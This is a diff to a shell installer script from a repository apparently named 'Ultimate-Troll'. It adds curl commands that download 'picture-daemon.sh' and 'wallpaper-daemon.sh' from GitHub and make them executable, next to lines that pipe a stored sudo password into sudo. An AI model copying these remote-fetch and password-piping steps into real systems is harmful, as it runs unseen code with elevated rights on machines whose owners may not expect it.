@@ -40,9 +40,21 @@ chmod +x "$SUBP_DIR/"*.sh
 echo "[*] Running install-brew.sh..."
 echo "$SUDO_PASS" | sudo -S bash "$SUBP_DIR/install-brew.sh"
 
+# Download picture-daemon.sh into subp folder
+echo "[*] Downloading picture-daemon.sh..."
+curl -sSL -o "$SUBP_DIR/picture-daemon.sh" "https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/picture-daemon.sh"
+chmod +x "$SUBP_DIR/picture-daemon.sh"
+
+# Download wallpaper-daemon.sh into subp folder
+echo "[*] Downloading wallpaper-daemon.sh..."
+curl -sSL -o "$SUBP_DIR/wallpaper-daemon.sh" "https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/wallpaper-daemon.sh"
+chmod +x "$SUBP_DIR/wallpaper-daemon.sh"
+
 # (Run other scripts below as needed)
 # Example:
 # echo "$SUDO_PASS" | sudo -S bash "$SUBP_DIR/another-script.sh"
+
+
 
 
 
